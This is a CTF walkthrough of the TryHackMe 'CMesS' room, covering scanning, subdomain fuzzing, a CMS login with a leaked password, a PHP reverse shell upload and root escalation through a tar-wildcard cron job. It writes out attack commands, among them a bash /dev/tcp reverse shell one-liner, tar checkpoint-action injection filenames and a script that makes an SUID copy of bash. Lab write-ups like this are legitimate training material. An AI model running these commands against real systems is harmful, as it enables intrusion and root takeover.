# CMesS-Detailed-CTF-writeup-THM
TryHackMe-CMesS Writeup -PART I  starting with Port scanning , Sub Domain Enum , Web exploitations , Reverse Shell and Escalating to Root User .

Can you root this Gila CMS box?

From the given description , we can get to know it is going to be Rooting the machine , by exploiting the CMS .

WARNING : Get your water bottle with you , because it going to take several hours . Enjoy the Room .

Room Link : https://tryhackme.com/r/room/cmess

Better , add MACHINE_IP cmess.thm to /etc/hosts [in Linux] , C:\Windows\System32\drivers\etc\hosts [in Windows] .

1.Join the room and start the Machine .

2.Ping to it , Ping is sending ICMP packets [it’s like ping-pong game] . When you send the request , the other end throw the Response . so , that we can make sure that , our Machine is up .

Bonus Tip: Ping is also used as Active Reccon , From the Ping Result we can get to know what type machine is Windows (or) Linux .

Mostly , If the TTL value is ,

Linux/Unix systems: The default TTL value is typically set to 60 to 64.

Windows systems: The default TTL value is generally set to 120–128.

Note the Word I mentioned , I said Mostly not all the Time .

3. Now let us do Port Scanning , I would Prefer “Rustscan” to find how many are open and what ports are they [ very Quickly ] .

>> rustscan -a IP_of_machine — ulimit 5000

with maximum thread count . Got 2 well-know Ports are Opened

22 -SSH and 80-HTTP.

4. Now we can go with “NMAP” for better Scanning Result ,

>> namp -sV IP_of_Machine -sC

i did , version scan and default Script Scanning .

BONUS TIP : NSE is Wriiten in LUA language .

5.We find port 22 and 80 open.In the NMAP scan result we see a directory called robots.txt.

BONUS TIP: robots.txt is a file that websites use to instruct web crawlers on which pages or sections of the site to crawl or avoid. Web crawling is the automated process by which search engines index the content of a website by systematically browsing its pages .

6. The directories that are mentioned in the robots.txt ,

Those Directory cannot be Accessed because of 403 Status code ,

BONUS TIP: The 403 Forbidden status code indicates that the server understands the request but refuses to authorize it, often due to insufficient permissions.

7. Now , Let us Try Directory Bruteforce . I perfer Tools “Dirsearch” and “Gobuster” . Dirsearch tool has Default Wordlist [ Small Wordlist] , we can also give customized wordlist in Dirsearch

>> dirsearch -u http://cmess.thm

and also try Gobuster for Better reults , we cannot relay result on one single open-source tool . we should try few tools to do opertions , so that we can decide the proper Result .

>> gobuster dir -u http://cmess.thm -w /path_to_the_wordlist .

It gives so many Directories with the status code of 200 .

we can see /admin dir but , we suppose to login .

8. so , we cannot access these , it is garbage for a time being . we should do Enumeration more on the HTTP [80 port] .

9. I have used , Brup to interecpt the traffic and analyze it , but i dosen’t work .

10. Now let us do Subdomain Bruteforce on the domain , “SubDomain” enumeration is plays very important role in Bug Hunting.

11. For SubDomain Bruteforce there are lot of tools available , few of them are

> Amass >Subfinder >ffuf >Brupsuite >wfuzz

I perfer wfuzz tool for SubDomain Fuzzing ,

i have used the wordlist of SecLists ‘s subdomains-top1million-5000.txt . It is mostly used for the subdomain Fuzzing .

12. Why “Dev” subdmain ? other Domains has Word Count of 290W , where “dev” has word count of 104W . so , Eyes went there and tried that .

13. Add “dev.cmess.thm” in Host file of Machine . Now access it from browser .

And i got page like

It looks like , there is conversation between the Andre and Support team , about patching the vulnerablites . And Andre requested support team to change her Passwd , and In this page They have mentioned her Password .

14. Get into the /admin page , And enter the andre mail id as Uname and Passwd that given in http://dev.cmess.thm .

15. Finally we get into the CMS , They are using Gila CMS with the version 1.10.9

16. Your task is to Do Reccon about Gila CMS and study about CVE ‘s of Gila CMS .

17. let’s come back up to our Machine , Now currently we our in CMS home page . Now our Mind should for the Reverse Shell .

16. We should find , Is there any place to upload our Reverse Shell Code . Finally I got it after spending some minutes . navigate to Content -> File Manager -> Assets -> Now Upload your ReverseShell code .

17. I go with PHP PentestMonkey , Refer : https://www.revshells.com/

18. Upload this Above PHP code in the Assets directory with some filename .

In my case rev.php .

19. For listening , I have used "Netcat" ,

>> nc -lvnp 4444

20. To Trigger , Let's navigate to the http://cmess.thm/assets/rev.php

21. We got Shell , Spawn it , I used Python to spawn it , BASH also can be used .

>>python3 -c 'import pty;pty.spawn("/bin/bash")'

22. Currently we are www-data user ,

BONUS TIP :

www-data is a common user account that many web servers (like Apache or Nginx) run under, especially on Unix/Linux systems. This user account has limited privileges and is used to execute web server processes securely.

23. Our Aim to get privileged to "andre" user so , that we can able to get "user.txt".

24. After spending some time , I did Enumerating on special files like .txt, .bak

Here , .bak file is backup file mostly available in Web-Servers .

So , How can we find for .bak file in this Huge File-System , For that , we use

>> find / -type f -iname "*.bak" 2>/dev/null

This command searches the entire file system (/) for files with the .bak extension, and outputs the results. The 2>/dev/null part suppresses any error messages (such as "permission denied") by redirecting them to /dev/null .

25. we got it , in the /opt dir with hidden file ,

>> cat /opt/.password.bak ,

26 . We got password of andre user , Passwd : U*********** .

27 . Switch user to andre , then we got user.txt ,

we got user.txt !!!!!!!!!!!!!!!!!

Not to Enjoy << We need to get into Root >> . let’s continue ,

28. Firstly , let’s get out from the Shell , Move to SSH

>> ssh andre@IP

29. Now let’s show our privilage Escalation skills,

30. We try running sudo -l -l , reading bash history . None of them Worked .

31. We can also try running a script such as linpeas , by opening Python server and getting by wget , But doesn’t work.

32 . Let’s do Check in Cron Jobs ,

>> cat /etc/crontab .

33. Got spicy Thing ,

34. Make use GTFO bins , for binary files misconfigurations , take it as bonus tip.

35. From seeing CronJobs , we get to know

Once we are in /home/andre/backup directory, we create a file called exploit.sh containing the following code(Basically what it is doing is copying bash to a temporary location and saving the same as rootbash and then we give rootbash suid permission) .

BONUS TIP:

The rootbash technique involves exploiting a misconfigured or writable .bashrc or .bash_profile file in the root directory. By appending a malicious command or reverse shell to this file, an attacker can execute code as the root user the next time the root account opens a terminal, effectively gaining root privileges.

36. In the Exploit.sh , [use Vim or nano ]

cp /bin/bash /tmp/rootbash

chmod +s /tmp/rootbash

37. Save it. Now we give our exploit.sh file executable permission using chmod +x command. And finally run the touch command as we saw on GTFO bins.

— checkpoint=1

— checkpoint-action=exec=/bin/sh

create these files in /home/andre/backup using ‘touch’ command ,

38.move to /tmp and we found “rootbash” as SUID permission ,

run it using ./rootbash -p command and you will be Root .

39. Or Alternative Way to write , one liner reverse shell cmd using BASH ,

>> bash -c ‘bash -i >& /dev/tcp/IP/port 0>&1 . In the Exploit.sh ,wait for a minute or two for the cronjob to run .

40. Finally , We are Root , get root.txt.






